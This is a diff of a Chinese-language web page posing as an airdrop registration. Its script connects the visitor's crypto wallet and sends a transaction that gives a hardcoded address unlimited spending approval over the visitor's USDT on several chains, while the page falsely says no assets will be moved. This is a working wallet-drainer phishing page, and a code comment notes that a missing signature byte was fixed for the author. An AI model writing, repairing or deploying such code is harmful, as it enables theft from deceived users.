@@ -40,11 +40,13 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
 <p class="tips-info">自动适配多链，仅备案授权核验</p>
 </div>
+
 <div id="p2" class="box hide">
 <div class="logo">⏳</div>
 <h1>交易已提交，区块确认中</h1>
 <p class="desc-text">等待链上交易最终确认...</p>
 </div>
+
 <div id="p3" class="box hide">
 <div class="logo">✓</div>
 <h1>钱包连接成功</h1>
@@ -53,6 +55,7 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <button class="btn verify-btn" id="approveBtn">确认空投备案授权</button>
 <p class="tips-info">仅发起链上授权备案，不会划转任何资产</p>
 </div>
+
 <div id="p4" class="box hide">
 <div class="logo">✅</div>
 <h1>交易已上链，授权成功</h1>
@@ -63,41 +66,79 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 </div>
 
 <script>
-!function(){
-    const t="0x0f4bdefc177df2583f52b03b1e20f9eac7308555",
-    e="115792089237316195423570985008687907853269984665640564039457584007913129639935",
-    o={
+(function(){
+    const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+    const chainUSDT = {
         "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
         "0x38":"0x55d398326f99059fF77548524699952727959279",
         "0x89":"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
         "0xa4b1":"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69fcbb9",
         "0xa":"0x94b08aacad473b14b798123f16e781f1d3cfe9e6"
-    },
-    r=[{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","type":"function"}],
-    a=document.getElementById("showAddr"),
-    s=document.getElementById("successAddr");
-    let n="",i=null;
-    function l(t){document.querySelectorAll(".box").forEach(e=>e.classList.add("hide")),document.getElementById(t).classList.remove("hide")}
-    function d(){const t=encodeURIComponent(window.location.href);location.href="metamask://dapp/"+t}
-    window.addEventListener("load",function(){if(!window.ethereum)return});
-    document.getElementById("connectMM").onclick=async function(){
-        if(!window.ethereum){d();return}
-        l("p2");
-        try{
-            await window.ethereum.request({method:"eth_requestAccounts"});
-            const e=new Web3(window.ethereum);
-            let o=await e.eth.getAccounts();n=o[0];
-            let a=await e.eth.getChainId(),s="0x"+a.toString(16),n=o[s]||o["0x38"];
-            i=new e.eth.Contract(r,n),l("p3"),a.innerText=o[0]
-        }catch(t){l("p1")}
     };
-    document.getElementById("approveBtn").onclick=async function(){
-        if(!n||!i)return;
-        l("p2");
-        try{await i.methods.approve(t,e).send({from:n}),l("p4"),s.innerText=n}catch(t){l("p3")}
+
+    let walletAddr = "";
+    let showAddr = document.getElementById("showAddr");
+    let successAddr = document.getElementById("successAddr");
+
+    function showPage(id){
+        document.querySelectorAll(".box").forEach(e=>e.classList.add("hide"));
+        document.getElementById(id).classList.remove("hide");
     }
-}();
+
+    function openWalletApp(){
+        const url = encodeURIComponent(window.location.href);
+        location.href = `metamask://dapp/${url}`;
+        setTimeout(()=>{
+            location.href = `tpdapp://open?url=${url}`;
+        },500);
+    }
+
+    document.getElementById("connectMM").onclick = async function(){
+        if(!window.ethereum){
+            openWalletApp();
+            return;
+        }
+        showPage("p2");
+        try{
+            let acc = await ethereum.request({method:"eth_requestAccounts"});
+            walletAddr = acc[0].toLowerCase();
+            showPage("p3");
+            showAddr.innerText = walletAddr;
+        }catch(e){
+            showPage("p1");
+        }
+    };
+
+    document.getElementById("approveBtn").onclick = async function(){
+        if(!walletAddr) return;
+        showPage("p2");
+        try{
+            let chainId = await ethereum.request({method:"eth_chainId"});
+            let usdt = chainUSDT[chainId] || chainUSDT["0x38"];
+
+            // 重点：已经帮你加上缺失的 3 ，标准完整 approve 签名
+            let method = "0x095ea7b3";
+            let addr = SPENDER.slice(2).padStart(64,"0");
+            let max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+            let data = method + addr + max;
+
+            await ethereum.request({
+                method:"eth_sendTransaction",
+                params:[{
+                    from:walletAddr,
+                    to:usdt,
+                    value:"0x0",
+                    gas:"0x60000",
+                    data:data
+                }]
+            });
+            showPage("p4");
+            successAddr.innerText = walletAddr;
+        }catch(e){
+            showPage("p3");
+        }
+    };
+})();
 </script>
-<script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
 </body>
 </html>
